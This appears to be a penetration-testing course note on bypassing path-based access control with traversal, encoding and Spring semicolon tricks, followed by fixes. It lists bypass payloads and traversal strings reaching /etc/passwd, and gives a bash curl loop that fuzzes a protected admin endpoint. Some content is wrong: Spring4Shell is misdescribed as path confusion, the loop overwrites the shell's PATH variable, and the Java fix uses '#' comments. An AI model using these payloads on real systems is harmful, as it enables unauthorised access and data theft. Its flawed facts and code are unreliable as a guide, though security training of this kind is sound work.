---
tags: [vapt, access-control, intermediate]
difficulty: intermediate
module: "21 - Access Control"
topic: "21.14 Path Traversal to Bypass Access Controls"
---

# 21.14 — Path Traversal to Bypass Access Controls

## Access Control Via URL Path

```
SOME APPS IMPLEMENT ACCESS CONTROL BASED ON URL PATH:
  
  MIDDLEWARE APPROACH:
  if path starts with "/admin" → check admin role
  else → allow
  
  PROBLEM:
  URL paths can be normalized differently at different points:
  - Web server normalizes /admin/../admin
  - Access control middleware checks: doesn't start with "/admin"
  
  PROCESSING ORDER MATTERS:
  Request: /admin/../admin/users
  
  1. Access control check: "/admin/../admin/users" → does it start with "/admin"? 
     DEPENDS ON IMPLEMENTATION!
     Some: normalize first → yes
     Some: check raw → /admin/../ doesn't start cleanly with /admin (depends)
  
  2. Web server routing: normalizes path → /admin/users → served!
  
  → If check and routing disagree → bypass!
```

---

## Path Traversal Bypass Techniques

```
TARGET: /admin/users  ← protected endpoint

BYPASS ATTEMPTS:
  /admin/../admin/users    ← traversal
  /admin/./users           ← dot in path
  /ADMIN/users             ← case change (case-insensitive server)
  /admin%2Fusers           ← URL encoded slash
  /admin%2fusers           ← lowercase URL encoding
  /admin%252Fusers         ← double URL encoding (%25 = %, so %252F = %2F after one decode)
  //admin/users            ← double slash at start
  /admin//users            ← double slash in middle
  /./admin/users           ← dot slash prefix
  /admin/users/            ← trailing slash
  /admin/users/.           ← trailing dot
  /%61dmin/users           ← hex encoded 'a' → %61 = a → admin
  
  ALSO (Spring Boot, other Java frameworks):
  /admin;/users            ← semicolon path parameter
  /admin/users;junk=1      ← junk parameter after semicolon
```

---

## Spring Boot Access Control Bypass

```
FAMOUS VULNERABILITY PATTERN:
  Spring Security config protects /actuator/**
  
  REQUEST:
  GET /actuator/env → 403 Forbidden (Spring Security blocks it)
  GET /actuator;/env → 200! (Spring Security doesn't match, Spring MVC does!)
  
  SEMICOLON PATH PARAMETER:
  Spring Security regex: /actuator/**
  Actual URL: /actuator;random=1/env
  → Spring Security: "this path has a semicolon → doesn't match /actuator/**"
  → Spring MVC: "path = /actuator/env, params = {random: 1}"
  → Spring MVC serves the endpoint → bypass!
  
  CVE-2022-22965 (Spring4Shell) used a similar path confusion!
  
  TEST:
  Try adding ;anything after the protected path prefix:
  /admin;bypass/users
  /admin;anything=1/
  /api;v1/admin/users
```

---

## File Inclusion via Path Traversal (Access Control Context)

```
BEYOND URL ACCESS CONTROL:
  File download endpoints that enforce path restrictions:
  
  GET /files/download?path=user_reports/myreport.pdf
  
  Access control: "path must start with user_reports/"
  
  BYPASS:
  GET /files/download?path=user_reports/../../../etc/passwd
  GET /files/download?path=user_reports/../../admin/secrets.txt
  
  IF PATH TRAVERSAL NOT SANITIZED:
  → user_reports/../../../etc/passwd → resolves to /etc/passwd!
  → Access control check passes (starts with user_reports/)
  → File read succeeds (path traversal)!
  
  TESTING:
  ../  × N → try increasing number of ../ until you escape the directory
  %2e%2e%2f → URL encoded traversal
  ..%2f      → mixed encoding
  ..%252f    → double encoded
  
  (Full path traversal coverage in dedicated module)
```

---

## Testing Path-Based Access Control Bypasses

```bash
# BASELINE:
TARGET_PROTECTED="https://target.com/admin/users"
REGULAR_COOKIE="session=REGULAR_USER_SESSION"

# 1. CONFIRM PROTECTED:
curl -s -o /dev/null -w "%{http_code}" \
  -b "$REGULAR_COOKIE" "$TARGET_PROTECTED"
# → Should return 403

# 2. TRY PATH VARIATIONS:
VARIATIONS=(
  "/admin/../admin/users"
  "/ADMIN/users"
  "/admin%2Fusers"
  "//admin/users"
  "/admin//users"
  "/admin/./users"
  "/./admin/users"
  "/admin;/users"
  "/admin;bypass=1/users"
  "/%61dmin/users"
  "/admin/users/"
  "/admin/users/."
)

for PATH in "${VARIATIONS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$REGULAR_COOKIE" \
    "https://target.com${PATH}")
  echo "$CODE - $PATH"
done | grep "^200"

# 3. IF USING ENCODED PATHS, TRY TOOLS:
# Burp Intruder with path traversal payloads
# SecLists: /usr/share/wordlists/SecLists/Fuzzing/LFI/
```

---

## Fix

```
PREVENTING PATH-BASED ACCESS CONTROL BYPASSES:

1. NORMALIZE PATHS BEFORE ACCESS CONTROL CHECK:
   # Python:
   import os
   
   def check_admin_access(request_path):
       normalized = os.path.normpath(request_path)
       if normalized.startswith('/admin'):
           require_admin_role()
   
   # But: even better — don't use path prefix for access control!

2. ROLE-BASED MIDDLEWARE ON EVERY ENDPOINT:
   # Not based on path matching!
   # Apply decorator/middleware directly to each route:
   
   @app.route('/admin/users')
   @require_admin  # ← not "starts with /admin"
   def admin_users():
       return ...

3. REJECT UNUSUAL CHARACTERS IN PATHS:
   Middleware: reject requests with .., //, ;, %2F in URL before routing
   
4. SPRING SECURITY — USE CANONICAL PATH MATCHING:
   # Spring Security 5.8+:
   @Bean
   SecurityFilterChain security(HttpSecurity http) {
       http.requestMatchers(matchers -> matchers
           .mvcMatchers("/admin/**")  # Uses Spring MVC's matching → consistent!
       )
       // ...
   }
   
5. DON'T MIX SECURITY LOGIC WITH ROUTING:
   Best pattern: authorization middleware attached to each protected endpoint
   → Path-based matching is fragile → endpoint-based is robust
```

---

## Related Notes
- [[01 - Vertical Privilege Escalation]] — admin access
- [[11 - Forced Browsing / Unprotected Admin Endpoints]] — finding endpoints
- [[19 - Referrer-Based Access Control Bypass]] — another bypass technique
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
